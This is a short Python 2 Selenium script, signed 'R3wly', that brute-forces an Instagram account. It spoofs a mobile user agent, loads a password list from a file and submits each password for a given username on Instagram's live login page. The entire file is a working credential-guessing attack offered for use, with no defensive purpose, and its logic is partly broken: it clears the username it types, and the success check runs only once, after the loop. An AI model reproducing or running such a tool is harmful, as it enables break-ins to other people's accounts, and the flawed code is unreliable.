from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
username = raw_input("Username Please: ")
passwords = raw_input("password txt in the same folder please: ")
profile = webdriver.FirefoxProfile()
profile.set_preference("general.useragent.override", "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
driver = webdriver.Firefox(profile)
driver.implicitly_wait(30)
print "You Will See In Your Browser If The Password Worked!"
print "Creat By R3wly"
    
fd = open(passwords,"rb")
password = fd.read()
password = password.split("\n")
print(password)
fd.close
     
    
for i in password:    
    print "try with pass:" + i
    driver.get("https://www.instagram.com/accounts/login/")
    driver.get_cookies()
    elem = driver.find_element_by_name("username")
    elem.send_keys(username)
    time.sleep(3)
    elem.clear()
    elem = driver.find_element_by_name("password")
    elem.send_keys(i)  
    time.sleep(5)
    elem.send_keys(Keys.RETURN)
    time.sleep(7)
    print driver.current_url
if driver.current_url == "https://www.instagram.com":
    print 'You Win'
    
    
else:
    print 'Wrong password'        

driver.refresh()


   
